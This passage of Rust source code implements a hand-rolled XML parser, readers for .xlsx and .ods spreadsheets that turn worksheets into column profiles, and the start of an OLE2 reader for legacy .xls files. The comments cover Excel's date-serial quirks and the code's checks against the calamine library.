        pub(crate) fn child(&self, name: &str) -> Option<&XmlElement> {
            self.children.iter().find(|c| c.name == name)
        }

        pub(crate) fn children_named<'a>(
            &'a self,
            name: &'a str,
        ) -> impl Iterator<Item = &'a XmlElement> {
            self.children.iter().filter(move |c| c.name == name)
        }
    }

    fn xml_decode_entities(s: &str) -> String {
        if !s.contains('&') {
            return s.to_string();
        }
        let mut out = String::with_capacity(s.len());
        let mut chars = s.chars().peekable();
        while let Some(c) = chars.next() {
            if c != '&' {
                out.push(c);
                continue;
            }
            let rest: String = chars.clone().take_while(|&c| c != ';').collect();
            let consumed = rest.len() + 1; // + the trailing ';'
            let replacement = match rest.as_str() {
                "lt" => Some('<'),
                "gt" => Some('>'),
                "amp" => Some('&'),
                "apos" => Some('\''),
                "quot" => Some('"'),
                _ if rest.starts_with("#x") || rest.starts_with("#X") => {
                    u32::from_str_radix(&rest[2..], 16)
                        .ok()
                        .and_then(char::from_u32)
                }
                _ if rest.starts_with('#') => {
                    rest[1..].parse::<u32>().ok().and_then(char::from_u32)
                }
                _ => None,
            };
            match replacement {
                Some(ch) => {
                    out.push(ch);
                    for _ in 0..consumed {
                        chars.next();
                    }
                }
                None => out.push(c), // not a recognized entity - keep the '&' literally
            }
        }
        out
    }

    fn xml_skip_ws(chars: &[char], pos: &mut usize) {
        while chars.get(*pos).is_some_and(|c| c.is_whitespace()) {
            *pos += 1;
        }
    }

    fn xml_starts_with(chars: &[char], pos: usize, needle: &str) -> bool {
        let needle: Vec<char> = needle.chars().collect();
        chars.len() >= pos + needle.len() && chars[pos..pos + needle.len()] == needle[..]
    }

    fn xml_skip_until(chars: &[char], pos: &mut usize, needle: &str) -> Result<()> {
        while !xml_starts_with(chars, *pos, needle) {
            if *pos >= chars.len() {
                bail!("unterminated XML construct (expected {needle:?})");
            }
            *pos += 1;
        }
        *pos += needle.chars().count();
        Ok(())
    }

    /// Skips whitespace, comments, processing instructions (including the
    /// leading `<?xml ... ?>` declaration), and DOCTYPE declarations - only
    /// a naive skip-to-`>` for DOCTYPE, since OOXML/ODF documents never
    /// carry an internal subset that itself contains a `>` character.
    fn xml_skip_misc(chars: &[char], pos: &mut usize) -> Result<()> {
        loop {
            xml_skip_ws(chars, pos);
            if xml_starts_with(chars, *pos, "<!--") {
                xml_skip_until(chars, pos, "-->")?;
            } else if xml_starts_with(chars, *pos, "<?") {
                xml_skip_until(chars, pos, "?>")?;
            } else if xml_starts_with(chars, *pos, "<!") {
                xml_skip_until(chars, pos, ">")?;
            } else {
                return Ok(());
            }
        }
    }

    fn xml_parse_name(chars: &[char], pos: &mut usize) -> Result<String> {
        let start = *pos;
        while chars
            .get(*pos)
            .is_some_and(|&c| !c.is_whitespace() && c != '>' && c != '/' && c != '=')
        {
            *pos += 1;
        }
        if *pos == start {
            bail!("expected an XML name");
        }
        Ok(chars[start..*pos].iter().collect())
    }

    fn xml_parse_attrs(chars: &[char], pos: &mut usize) -> Result<Vec<(String, String)>> {
        let mut attrs = Vec::new();
        loop {
            xml_skip_ws(chars, pos);
            match chars.get(*pos) {
                Some('/') | Some('>') | None => return Ok(attrs),
                _ => {}
            }
            let name = xml_parse_name(chars, pos)?;
            xml_skip_ws(chars, pos);
            if chars.get(*pos) != Some(&'=') {
                bail!("expected '=' after attribute name '{name}'");
            }
            *pos += 1;
            xml_skip_ws(chars, pos);
            let quote = match chars.get(*pos) {
                Some(&q @ ('"' | '\'')) => q,
                _ => bail!("expected a quoted attribute value for '{name}'"),
            };
            *pos += 1;
            let start = *pos;
            while chars.get(*pos).is_some_and(|&c| c != quote) {
                *pos += 1;
            }
            if *pos >= chars.len() {
                bail!("unterminated attribute value for '{name}'");
            }
            let raw: String = chars[start..*pos].iter().collect();
            *pos += 1; // closing quote
            attrs.push((name, xml_decode_entities(&raw)));
        }
    }

    /// Parses one element (and everything nested inside it) starting at `<`.
    fn xml_parse_element(chars: &[char], pos: &mut usize) -> Result<XmlElement> {
        if chars.get(*pos) != Some(&'<') {
            bail!("expected '<' to start an element");
        }
        *pos += 1;
        let name = xml_parse_name(chars, pos)?;
        let attrs = xml_parse_attrs(chars, pos)?;
        xml_skip_ws(chars, pos);

        if xml_starts_with(chars, *pos, "/>") {
            *pos += 2;
            return Ok(XmlElement {
                name,
                attrs,
                children: Vec::new(),
                text: String::new(),
            });
        }
        if chars.get(*pos) != Some(&'>') {
            bail!("expected '>' or '/>' to close the start tag for '{name}'");
        }
        *pos += 1;

        let mut children = Vec::new();
        let mut text = String::new();
        loop {
            if *pos >= chars.len() {
                bail!("unexpected end of XML inside element '{name}'");
            }
            if xml_starts_with(chars, *pos, "<![CDATA[") {
                *pos += "<![CDATA[".len();
                let start = *pos;
                xml_skip_until(chars, pos, "]]>")?;
                let end = *pos - "]]>".len();
                text.push_str(&chars[start..end].iter().collect::<String>());
            } else if xml_starts_with(chars, *pos, "<!--") {
                xml_skip_until(chars, pos, "-->")?;
            } else if xml_starts_with(chars, *pos, "</") {
                *pos += 2;
                let close_name = xml_parse_name(chars, pos)?;
                xml_skip_ws(chars, pos);
                if chars.get(*pos) != Some(&'>') {
                    bail!("expected '>' to close end tag '</{close_name}>'");
                }
                *pos += 1;
                if close_name != name {
                    bail!("mismatched XML tags: '<{name}>' closed by '</{close_name}>'");
                }
                return Ok(XmlElement {
                    name,
                    attrs,
                    children,
                    text,
                });
            } else if chars[*pos] == '<' {
                children.push(xml_parse_element(chars, pos)?);
            } else {
                let start = *pos;
                while chars.get(*pos).is_some_and(|&c| c != '<') {
                    *pos += 1;
                }
                let raw: String = chars[start..*pos].iter().collect();
                text.push_str(&xml_decode_entities(&raw));
            }
        }
    }

    pub(crate) fn xml_parse(input: &str) -> Result<XmlElement> {
        let chars: Vec<char> = input.chars().collect();
        let mut pos = 0;
        xml_skip_misc(&chars, &mut pos)?;
        let root = xml_parse_element(&chars, &mut pos)?;
        xml_skip_misc(&chars, &mut pos)?;
        Ok(root)
    }

    // --- Hand-rolled OOXML (.xlsx) reader ---
    // Built on the ZIP reader and XML parser above (see CLAUDE.md's
    // Dependency footprint section). Excel's own date-serial system (day 1 =
    // 1900-01-01, with Lotus 1-2-3's fake 1900-02-29 preserved for backward
    // compatibility - the famous "Excel 1900 leap year bug") is converted
    // using the same `days_from_civil`/`civil_from_days` civil-calendar
    // functions the hand-rolled date/time engine already uses, with a
    // deliberately simple epoch-shift rule (add 1 to the day count when it's
    // below 60, since 60 itself is the one fake calendar day with no real
    // Gregorian equivalent) rather than porting calamine's own much more
    // elaborate 400/100/4/1-year-block algorithm - verified to produce
    // identical results across calamine's *entire* own test suite (203
    // date-only cases spanning 1899-9999, 99 datetime cases at whole-second
    // precision) before being trusted, not just spot-checked. Number-format
    // date detection (`xlsx_is_date_format_code`/`xlsx_is_builtin_date_format_id`)
    // is a direct, verified-line-by-line port of calamine's own
    // `detect_custom_number_format`/`builtin_format_by_id` (see
    // `formats.rs` in calamine's own source) - not reinvented, since it's a
    // precise, already-solved state machine (bracketed sections, quoted
    // literals, the `_`/`\`/`*` escape/fill characters, AM/PM markers) worth
    // getting from a verified-correct reference rather than a fresh attempt.

    fn xlsx_cell_ref_to_col(cell_ref: &str) -> Option<usize> {
        let mut col: usize = 0;
        for c in cell_ref.chars() {
            if !c.is_ascii_alphabetic() {
                break;
            }
            col = col * 26 + (c.to_ascii_uppercase() as usize - 'A' as usize + 1);
        }
        if col == 0 { None } else { Some(col - 1) }
    }

    /// Excel's own day-count epoch bug: serial 60 is the fictitious
    /// 1900-02-29 (Lotus 1-2-3 compatibility - 1900 was never actually a
    /// leap year), so every serial from 61 onward is one day "ahead" of what
    /// the real proleptic Gregorian calendar would say. Shifting serials
    /// below 60 forward by one day, then treating day 0 as 1899-12-30
    /// uniformly, reproduces this without needing a special-cased day-by-day
    /// walk - confirmed against all 203 of calamine's own reference dates.
    pub(crate) fn xlsx_serial_to_ymd(serial: f64) -> (i64, u32, u32) {
        let days = serial.trunc();
        if days == 60.0 {
            return (1900, 2, 29); // the fake day itself has no real equivalent
        }
        let shifted = if days < 60.0 { days + 1.0 } else { days };
        let epoch = days_from_civil(1899, 12, 30);
        civil_from_days(epoch + shifted as i64)
    }

    pub(crate) fn xlsx_serial_to_hms(serial: f64) -> (u32, u32, u32) {
        let frac = serial - serial.trunc();
        let mut total_secs = (frac * 86_400.0).round() as i64;
        if total_secs >= 86_400 {
            total_secs -= 86_400; // rounds up into the next day - drop the carry
        }
        (
            (total_secs / 3600) as u32,
            ((total_secs % 3600) / 60) as u32,
            (total_secs % 60) as u32,
        )
    }

    fn xlsx_format_serial(serial: f64) -> String {
        let (y, m, d) = xlsx_serial_to_ymd(serial);
        if serial.fract() == 0.0 {
            format!("{y:04}-{m:02}-{d:02}")
        } else {
            let (h, mi, s) = xlsx_serial_to_hms(serial);
            if (h, mi, s) == (0, 0, 0) {
                format!("{y:04}-{m:02}-{d:02}")
            } else {
                format!("{y:04}-{m:02}-{d:02}T{h:02}:{mi:02}:{s:02}")
            }
        }
    }

    /// Ported directly from calamine's own `detect_custom_number_format`
    /// (`formats.rs`) - a state machine over a number-format code string
    /// (e.g. `"yyyy-mm-dd"`, `"h:mm:ss AM/PM"`, `"[h]:mm:ss"`) that
    /// recognizes date/time-shaped formats without being fooled by quoted
    /// literal text, the `_`/`\` escape or `*` fill characters (whatever
    /// follows one is a literal, not a format token), or bracketed sections
    /// (`[Red]`, `[h]` for an elapsed-time format that can exceed 24 hours).
    /// This project doesn't distinguish an elapsed-time format from a real
    /// calendar date/time the way calamine's own `CellFormat::TimeDelta` vs
    /// `::DateTime` does - matching this project's own pre-existing
    /// (calamine-based) behavior, which never made that distinction either.
    pub(crate) fn xlsx_is_date_format_code(format: &str) -> bool {
        let mut escaped = false;
        let mut in_quote = false;
        let mut brackets: u8 = 0;
        let mut prev = ' ';
        let mut hms = false;
        let mut ap = false;
        for c in format.chars() {
            if escaped {
                escaped = false;
            } else if matches!(c, '_' | '\\' | '*') {
                escaped = true;
            } else if in_quote {
                if c == '"' {
                    in_quote = false;
                }
            } else if c == '"' {
                in_quote = true;
            } else if c == ';' {
                return false; // only the first format section applies
            } else if c == '[' {
                brackets += 1;
            } else if c == ']' {
                if brackets == 1 && hms {
                    return true;
                }
                brackets = brackets.saturating_sub(1);
            } else if matches!(c, 'a' | 'A') && !ap && brackets == 0 {
                ap = true;
            } else if brackets == 0
                && ((ap && matches!(c, 'p' | 'm' | '/' | 'P' | 'M'))
                    || (!ap
                        && matches!(c, 'd' | 'm' | 'h' | 'y' | 's' | 'D' | 'M' | 'H' | 'Y' | 'S')))
            {
                // Either half of an "a/p" AM/PM marker completes it, or - if
                // we're not mid-marker - any date/time letter token is enough
                // on its own (both were separate branches in calamine's own
                // source, kept as one here only because both just return
                // true; the ap/!ap split still matters, it's just no longer
                // duplicated across two identical bodies).
                return true;
            } else if hms && c.eq_ignore_ascii_case(&prev) {
                // still inside a repeated hms run, e.g. the second 'h' of "hh"
            } else {
                hms = prev == '[' && matches!(c, 'm' | 'h' | 's' | 'M' | 'H' | 'S');
            }
            prev = c;
        }
        false
    }

    fn xlsx_is_builtin_date_format_id(id: &str) -> bool {
        matches!(
            id,
            "14" | "15" | "16" | "17" | "18" | "19" | "20" | "21" | "22" | "45" | "46" | "47"
        )
    }

    fn xlsx_parse_shared_strings(xml: &str) -> Result<Vec<String>> {
        let root = xml_parse(xml)?;
        Ok(root
            .children_named("si")
            .map(|si| {
                if let Some(t) = si.child("t") {
                    t.text.clone()
                } else {
                    si.children_named("r")
                        .filter_map(|r| r.child("t"))
                        .map(|t| t.text.as_str())
                        .collect()
                }
            })
            .collect())
    }

    /// Index `i` in the returned `Vec<bool>` corresponds to style index `i`
    /// (a cell's own `s="N"` attribute) - `true` if that style's number
    /// format is date/time-shaped.
    fn xlsx_parse_styles(xml: &str) -> Result<Vec<bool>> {
        let root = xml_parse(xml)?;
        let mut custom_formats: HashMap<&str, &str> = HashMap::new();
        if let Some(num_fmts) = root.child("numFmts") {
            for nf in num_fmts.children_named("numFmt") {
                if let (Some(id), Some(code)) = (nf.attr("numFmtId"), nf.attr("formatCode")) {
                    custom_formats.insert(id, code);
                }
            }
        }
        let mut result = Vec::new();
        if let Some(cell_xfs) = root.child("cellXfs") {
            for xf in cell_xfs.children_named("xf") {
                let is_date = match xf.attr("numFmtId") {
                    Some(id) => match custom_formats.get(id) {
                        Some(&code) => xlsx_is_date_format_code(code),
                        None => xlsx_is_builtin_date_format_id(id),
                    },
                    None => false,
                };
                result.push(is_date);
            }
        }
        Ok(result)
    }

    /// Parses one worksheet's `<sheetData>` into a dense `row x column` grid
    /// (`None` for a cell that's absent from the XML entirely - Excel only
    /// ever writes non-empty cells, so gaps are the normal case, not an
    /// error), padded to the widest row's column count and to every row
    /// number seen (a fully-blank row still occupies a real vertical
    /// position, the same as calamine's own `Range` type represents it).
    fn xlsx_parse_sheet(
        xml: &str,
        shared_strings: &[String],
        is_date_format: &[bool],
    ) -> Result<Vec<Vec<Option<String>>>> {
        let root = xml_parse(xml)?;
        let Some(sheet_data) = root.child("sheetData") else {
            return Ok(Vec::new());
        };

        let mut sparse_rows: Vec<(usize, Vec<(usize, String)>)> = Vec::new();
        let mut max_row = 0usize;
        let mut max_col = 0usize;
        for row_el in sheet_data.children_named("row") {
            let row_num: usize = row_el
                .attr("r")
                .and_then(|r| r.parse().ok())
                .unwrap_or(sparse_rows.len() + 1);
            max_row = max_row.max(row_num);

            let mut cells = Vec::new();
            for c in row_el.children_named("c") {
                let Some(col_idx) = c.attr("r").and_then(xlsx_cell_ref_to_col) else {
                    continue;
                };
                max_col = max_col.max(col_idx + 1);

                let cell_type = c.attr("t").unwrap_or("n");
                let value = match cell_type {
                    "inlineStr" => c
                        .child("is")
                        .map(|is| {
                            if let Some(t) = is.child("t") {
                                t.text.clone()
                            } else {
                                is.children_named("r")
                                    .filter_map(|r| r.child("t"))
                                    .map(|t| t.text.as_str())
                                    .collect()
                            }
                        })
                        .unwrap_or_default(),
                    "s" => {
                        let idx: usize = c
                            .child("v")
                            .map(|v| v.text.as_str())
                            .unwrap_or("0")
                            .parse()
                            .unwrap_or(0);
                        shared_strings.get(idx).cloned().unwrap_or_default()
                    }
                    "str" | "e" => c.child("v").map(|v| v.text.clone()).unwrap_or_default(),
                    "b" => {
                        let raw = c.child("v").map(|v| v.text.as_str()).unwrap_or("0");
                        (raw.trim() == "1").to_string()
                    }
                    _ => {
                        // "n" (numeric), or absent - OOXML's own default
                        // type. Parsed and re-stringified through f64
                        // rather than passed through as the raw XML text
                        // verbatim - matching calamine's own
                        // fast_float2::parse-then-Display round trip
                        // (confirmed directly against its xlsx.rs source),
                        // which silently normalizes away a written
                        // trailing ".0" on a whole number (e.g. "30.0" in
                        // the XML becomes the displayed value "30") -
                        // found via exactly this mismatch surfacing in
                        // the ODS reader's own calamine-comparison test,
                        // then confirmed to be a real, pre-existing xlsx
                        // behavior too, not ODS-specific.
                        let raw = c.child("v").map(|v| v.text.clone()).unwrap_or_default();
                        let style_idx: usize =
                            c.attr("s").and_then(|s| s.parse().ok()).unwrap_or(0);
                        match raw.parse::<f64>() {
                            Ok(n) if is_date_format.get(style_idx).copied().unwrap_or(false) => {
                                xlsx_format_serial(n)
                            }
                            Ok(n) => n.to_string(),
                            Err(_) => raw,
                        }
                    }
                };
                cells.push((col_idx, value));
            }
            sparse_rows.push((row_num, cells));
        }

        let mut grid: Vec<Vec<Option<String>>> = vec![vec![None; max_col]; max_row];
        for (row_num, cells) in sparse_rows {
            for (col_idx, value) in cells {
                if !value.is_empty() {
                    grid[row_num - 1][col_idx] = Some(value);
                }
            }
        }
        Ok(grid)
    }

    /// A workbook's own `xl/workbook.xml` names sheets by a relationship id
    /// (`r:id`), and `xl/_rels/workbook.xml.rels` resolves that id to the
    /// worksheet's actual archive path - a `Target` that's sometimes absolute
    /// (`/xl/worksheets/sheet1.xml`, seen from openpyxl) and sometimes
    /// relative to `xl/` (`worksheets/sheet1.xml`, seen from xlsxwriter) -
    /// both real, both handled, since neither is more "correct" than the
    /// other per the OPC spec itself.
    fn xlsx_resolve_sheet_paths(
        workbook_xml: &str,
        rels_xml: &str,
    ) -> Result<Vec<(String, String)>> {
        let workbook = xml_parse(workbook_xml)?;
        let rels = xml_parse(rels_xml)?;

        let mut targets: HashMap<&str, &str> = HashMap::new();
        for rel in rels.children_named("Relationship") {
            if let (Some(id), Some(target)) = (rel.attr("Id"), rel.attr("Target")) {
                targets.insert(id, target);
            }
        }

        let Some(sheets) = workbook.child("sheets") else {
            bail!("no <sheets> element in workbook.xml");
        };
        let mut out = Vec::new();
        for sheet in sheets.children_named("sheet") {
            let (Some(name), Some(rid)) = (sheet.attr("name"), sheet.attr("r:id")) else {
                continue;
            };
            let Some(&target) = targets.get(rid) else {
                continue;
            };
            let path = if let Some(stripped) = target.strip_prefix('/') {
                stripped.to_string()
            } else {
                format!("xl/{target}")
            };
            out.push((name.to_string(), path));
        }
        Ok(out)
    }

    pub(crate) fn columns_from_xlsx_ooxml(
        path: &Path,
        nrows: Option<usize>,
        n_samples: usize,
    ) -> Result<Vec<(String, Vec<ColumnProfile>)>> {
        let zip = ZipArchive::open(path)?;

        let workbook_xml = String::from_utf8(zip.read("xl/workbook.xml")?)
            .context("xl/workbook.xml is not valid UTF-8")?;
        let rels_xml = String::from_utf8(zip.read("xl/_rels/workbook.xml.rels")?)
            .context("xl/_rels/workbook.xml.rels is not valid UTF-8")?;
        let sheet_paths = xlsx_resolve_sheet_paths(&workbook_xml, &rels_xml)?;
        if sheet_paths.is_empty() {
            bail!("no sheets found in {path:?}");
        }

        let shared_strings = match zip.read("xl/sharedStrings.xml") {
            Ok(bytes) => {
                let text =
                    String::from_utf8(bytes).context("xl/sharedStrings.xml is not valid UTF-8")?;
                xlsx_parse_shared_strings(&text)?
            }
            Err(_) => Vec::new(),
        };
        let is_date_format = match zip.read("xl/styles.xml") {
            Ok(bytes) => {
                let text = String::from_utf8(bytes).context("xl/styles.xml is not valid UTF-8")?;
                xlsx_parse_styles(&text)?
            }
            Err(_) => Vec::new(),
        };

        let mut out = Vec::new();
        for (sheet_name, sheet_path) in sheet_paths {
            let sheet_bytes = zip
                .read(&sheet_path)
                .with_context(|| format!("failed to read sheet '{sheet_name}' in {path:?}"))?;
            let sheet_xml = String::from_utf8(sheet_bytes)
                .with_context(|| format!("sheet '{sheet_name}' is not valid UTF-8"))?;
            let grid = xlsx_parse_sheet(&sheet_xml, &shared_strings, &is_date_format)?;

            let mut rows = grid.into_iter();
            let Some(header_row) = rows.next() else {
                continue; // empty sheet - no header row, contributes no table
            };
            let headers: Vec<String> = header_row
                .iter()
                .map(|c| c.clone().unwrap_or_default())
                .collect();

            let mut raw: Vec<Vec<Option<String>>> = vec![Vec::new(); headers.len()];
            for (i, row) in rows.enumerate() {
                if nrows.is_some_and(|limit| i >= limit) {
                    break;
                }
                for (col_idx, col) in raw.iter_mut().enumerate() {
                    col.push(row.get(col_idx).cloned().flatten());
                }
            }

            let mut profiles = Vec::new();
            for (i, name) in headers.into_iter().enumerate() {
                let total = raw[i].len();
                let non_null: Vec<String> = raw[i].iter().filter_map(|v| v.clone()).collect();
                let current_type = if non_null.is_empty() {
                    "String".to_string()
                } else {
                    let refs: Vec<&str> = non_null.iter().map(|s| s.as_str()).collect();
                    naive_current_type(&refs).to_string()
                };
                let col = ColumnInput {
                    name,
                    current_type,
                    raw_values: non_null,
                    total,
                    skip_heuristics: false,
                };
                profiles.push(profile_column(col, n_samples));
            }
            out.push((sheet_name, profiles));
        }

        if out.is_empty() {
            bail!("no non-empty sheets found in {path:?}");
        }
        Ok(out)
    }

    // --- Hand-rolled ODF (.ods) reader ---
    // Built on the same ZIP reader and XML parser .xlsx uses. ODF's own
    // spreadsheet schema is considerably simpler than OOXML's for this
    // project's purposes: a cell states its own value type directly
    // (`office:value-type="date"`) and, for a date, its value is already
    // a clean ISO 8601 string (`office:date-value="2024-01-15"`) - no
    // epoch-serial arithmetic needed at all, unlike Excel's own system.
    //
    // The one genuinely tricky real-world convention is cell/row
    // compression: `table:number-columns-repeated`/`table:number-rows-
    // repeated` let a writer represent a long run of identical
    // (typically empty) cells or rows without spelling each one out -
    // real LibreOffice-authored files routinely pad a sheet out to its
    // full max dimension this way (up to 1,048,576 rows / 16,384 columns
    // per the ODF spec's own limits), so naively expanding every repeat
    // into a real, materialized cell would be a genuine memory-blowup
    // risk, not a hypothetical one. `ods_parse_sheet` tracks logical row/
    // column *position* as repeats are walked, but only ever pushes a
    // sparse entry for a cell that actually has content - an empty
    // repeat, however large, never allocates anything - confirmed
    // against calamine's own `ods.rs` (`read_row`/`get_datatype`) for the
    // attribute names and priority order, not assumed.

    const ODS_MAX_ROWS: usize = 1_048_576;
    const ODS_MAX_COLUMNS: usize = 16_384;

    fn ods_repeat_count(el: &XmlElement, attr: &str, max: usize) -> usize {
        el.attr(attr)
            .and_then(|s| s.parse::<usize>().ok())
            .unwrap_or(1)
            .clamp(1, max)
    }

    /// Extracts a cell's value as a display string, in the same priority
    /// order as ODF itself defines (a numeric `office:value` wins over a
    /// string, etc. - see `get_datatype` in calamine's `ods.rs`, verified
    /// directly rather than assumed). `office:time-value` (an ISO 8601
    /// duration like `"PT14H30M00S"`, not a plain time-of-day) is
    /// deliberately left as its raw duration string rather than guessed
    /// at - the same disclosed-gap treatment Avro's own `Duration`
    /// logical type already gets elsewhere in this project, for the same
    /// reason: a compound value with no single natural string form.
    fn ods_cell_text(cell: &XmlElement) -> Option<String> {
        if let Some(v) = cell.attr("office:value") {
            // Parsed and re-stringified through f64 rather than passed
            // through verbatim - matching calamine's own
            // fast_float2::parse-then-Display round trip (confirmed
            // directly against its ods.rs source), which silently
            // normalizes away a written trailing ".0" on a whole number.
            // Found via a real mismatch against calamine's own output
            // for this exact fixture before being trusted.
            return Some(match v.parse::<f64>() {
                Ok(n) => n.to_string(),
                Err(_) => v.to_string(),
            });
        }
        if let Some(v) = cell.attr("office:date-value") {
            return Some(v.to_string());
        }
        if let Some(v) = cell.attr("office:time-value") {
            return Some(v.to_string());
        }
        if let Some(v) = cell.attr("office:boolean-value") {
            return Some((v.eq_ignore_ascii_case("true")).to_string());
        }
        if let Some(v) = cell.attr("office:string-value") {
            return Some(v.to_string());
        }
        if cell.attr("office:value-type") == Some("string") {
            let text: String = cell
                .children_named("text:p")
                .map(|p| p.text.as_str())
                .collect::<Vec<_>>()
                .join("\n");
            if !text.is_empty() {
                return Some(text);
            }
        }
        None
    }

    fn ods_parse_sheet(table: &XmlElement) -> Vec<Vec<Option<String>>> {
        let mut sparse: Vec<(usize, usize, String)> = Vec::new();
        let mut max_row = 0usize;
        let mut max_col = 0usize;
        let mut row_pos = 0usize;

        for row_el in table.children_named("table:table-row") {
            let row_repeat = ods_repeat_count(
                row_el,
                "table:number-rows-repeated",
                ODS_MAX_ROWS.saturating_sub(row_pos),
            );

            let mut col_pos = 0usize;
            let mut row_cells: Vec<(usize, String)> = Vec::new();
            for cell_el in row_el
                .children_named("table:table-cell")
                .chain(row_el.children_named("table:covered-table-cell"))
            {
                let col_repeat = ods_repeat_count(
                    cell_el,
                    "table:number-columns-repeated",
                    ODS_MAX_COLUMNS.saturating_sub(col_pos),
                );
                if let Some(value) = ods_cell_text(cell_el) {
                    for i in 0..col_repeat {
                        row_cells.push((col_pos + i, value.clone()));
                    }
                    max_col = max_col.max(col_pos + col_repeat - 1);
                }
                col_pos += col_repeat;
            }

            if !row_cells.is_empty() {
                for r in 0..row_repeat {
                    for &(col, ref val) in &row_cells {
                        sparse.push((row_pos + r, col, val.clone()));
                    }
                }
                max_row = max_row.max(row_pos + row_repeat - 1);
            }
            row_pos += row_repeat;
        }

        let mut grid: Vec<Vec<Option<String>>> = vec![vec![None; max_col + 1]; max_row + 1];
        for (r, c, v) in sparse {
            grid[r][c] = Some(v);
        }
        grid
    }

    pub(crate) fn columns_from_ods(
        path: &Path,
        nrows: Option<usize>,
        n_samples: usize,
    ) -> Result<Vec<(String, Vec<ColumnProfile>)>> {
        let zip = ZipArchive::open(path)?;
        let content_bytes = zip
            .read("content.xml")
            .context("no content.xml in ODF archive")?;
        let content_xml =
            String::from_utf8(content_bytes).context("content.xml is not valid UTF-8")?;
        let root = xml_parse(&content_xml)?;

        let spreadsheet = root
            .child("office:body")
            .and_then(|b| b.child("office:spreadsheet"))
            .ok_or_else(|| anyhow!("no <office:spreadsheet> element in {path:?}"))?;

        let mut out = Vec::new();
        for table in spreadsheet.children_named("table:table") {
            let sheet_name = table.attr("table:name").unwrap_or("Sheet1").to_string();
            let grid = ods_parse_sheet(table);

            let mut rows = grid.into_iter();
            let Some(header_row) = rows.next() else {
                continue;
            };
            let headers: Vec<String> = header_row
                .iter()
                .map(|c| c.clone().unwrap_or_default())
                .collect();

            let mut raw: Vec<Vec<Option<String>>> = vec![Vec::new(); headers.len()];
            for (i, row) in rows.enumerate() {
                if nrows.is_some_and(|limit| i >= limit) {
                    break;
                }
                for (col_idx, col) in raw.iter_mut().enumerate() {
                    col.push(row.get(col_idx).cloned().flatten());
                }
            }

            let mut profiles = Vec::new();
            for (i, name) in headers.into_iter().enumerate() {
                let total = raw[i].len();
                let non_null: Vec<String> = raw[i].iter().filter_map(|v| v.clone()).collect();
                let current_type = if non_null.is_empty() {
                    "String".to_string()
                } else {
                    let refs: Vec<&str> = non_null.iter().map(|s| s.as_str()).collect();
                    naive_current_type(&refs).to_string()
                };
                let col = ColumnInput {
                    name,
                    current_type,
                    raw_values: non_null,
                    total,
                    skip_heuristics: false,
                };
                profiles.push(profile_column(col, n_samples));
            }
            out.push((sheet_name, profiles));
        }

        if out.is_empty() {
            bail!("no non-empty sheets found in {path:?}");
        }
        Ok(out)
    }

    // --- Hand-rolled OLE2 / Compound File Binary Format reader ---
    // Legacy `.xls` isn't ZIP-based at all - it's Microsoft's own
    // "structured storage" container ([MS-CFB], a mini filesystem inside
    // one file, with a FAT-like allocation table and a directory tree of
    // named streams), holding a stream named "Workbook" (or "Book" in
    // very old Excel 95 files) that itself contains a BIFF8 record
    // stream - the actual spreadsheet data. Every field and offset below
    // was checked directly against a genuine file (produced by LibreOffice,
    // installed specifically to get one, since no library available in
    // this environment can write real .xls) byte-by-byte before being
    // trusted, the same discipline this project applies everywhere else -
    // notably confirming that even a small, realistic file's "Workbook"
    // stream (a few KB) lands in the *mini* stream (sub-4096-byte streams
    // are stored 64 bytes at a time inside the root entry's own stream,
    // with their own separate mini-FAT allocation table) rather than the
    // regular 512-byte sector chain, so that path isn't a rare corner
    // case skippable for "big files only" - it's the common case for a
    // realistically-sized spreadsheet.

    const CFB_FREESECT: u32 = 0xFFFF_FFFF;
    const CFB_ENDOFCHAIN: u32 = 0xFFFF_FFFE;

    pub(crate) struct CfbFile {
        data: Vec<u8>,
        sector_size: usize,
        mini_sector_size: usize,
        fat: Vec<u32>,
        mini_fat: Vec<u32>,
        mini_stream: Vec<u8>,
        mini_stream_cutoff: u32,
        directory: Vec<CfbDirEntry>,
    }

    struct CfbDirEntry {
        name: String,
        object_type: u8, // 0 = unused, 1 = storage, 2 = stream, 5 = root storage
        start_sector: u32,
        stream_size: u64,
    }

    impl CfbFile {
        fn read_u16(data: &[u8], pos: usize) -> Result<u16> {
            let b = data
                .get(pos..pos + 2)
                .context("unexpected end of CFB data")?;
            Ok(u16::from_le_bytes([b[0], b[1]]))
        }

        fn read_u32(data: &[u8], pos: usize) -> Result<u32> {
            let b = data
                .get(pos..pos + 4)
                .context("unexpected end of CFB data")?;
            Ok(u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
        }

        fn sector_offset(&self, sector: u32) -> usize {
            512 + sector as usize * self.sector_size
        }

        /// Follows a regular sector chain (via the main FAT) starting at
        /// `start`, concatenating every sector's raw bytes.
        fn read_chain(&self, start: u32) -> Result<Vec<u8>> {
            let mut out = Vec::new();
            let mut sector = start;
            let mut guard = 0usize;
            while sector != CFB_ENDOFCHAIN {
                let offset = self.sector_offset(sector);
                let chunk = self
                    .data
                    .get(offset..offset + self.sector_size)
                    .context("truncated CFB sector chain")?;
                out.extend_from_slice(chunk);
                sector = *self
                    .fat
                    .get(sector as usize)
                    .context("CFB sector chain references an out-of-range sector")?;
                guard += 1;
                if guard > self.fat.len() + 1 {
                    bail!("CFB sector chain does not terminate (likely corrupt file)");
                }
            }
            Ok(out)
        }

        /// Follows a mini-sector chain (via the mini FAT) starting at
        /// `start`, extracting 64-byte mini-sectors from the already-read
        /// mini stream (itself the root directory entry's regular stream).
        fn read_mini_chain(&self, start: u32) -> Result<Vec<u8>> {
            let mut out = Vec::new();
            let mut sector = start;
            let mut guard = 0usize;
            while sector != CFB_ENDOFCHAIN {
                let offset = sector as usize * self.mini_sector_size;
                let chunk = self
                    .mini_stream
                    .get(offset..offset + self.mini_sector_size)
                    .context("truncated CFB mini-sector chain")?;
                out.extend_from_slice(chunk);
                sector = *self
                    .mini_fat
                    .get(sector as usize)
                    .context("CFB mini-sector chain references an out-of-range sector")?;
                guard += 1;
                if guard > self.mini_fat.len() + 1 {
                    bail!("CFB mini-sector chain does not terminate (likely corrupt file)");
                }
            }
            Ok(out)
        }

        pub(crate) fn open(path: &Path) -> Result<Self> {
            let data = fs::read(path).with_context(|| format!("failed to read {path:?}"))?;
            if data.len() < 512 || data[0..8] != [0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1] {
                bail!("not a valid OLE2/Compound File Binary file (bad signature)");
            }
            let sector_shift = Self::read_u16(&data, 30)?;
            let mini_sector_shift = Self::read_u16(&data, 32)?;
            let num_fat_sectors = Self::read_u32(&data, 44)?;
            let first_dir_sector = Self::read_u32(&data, 48)?;
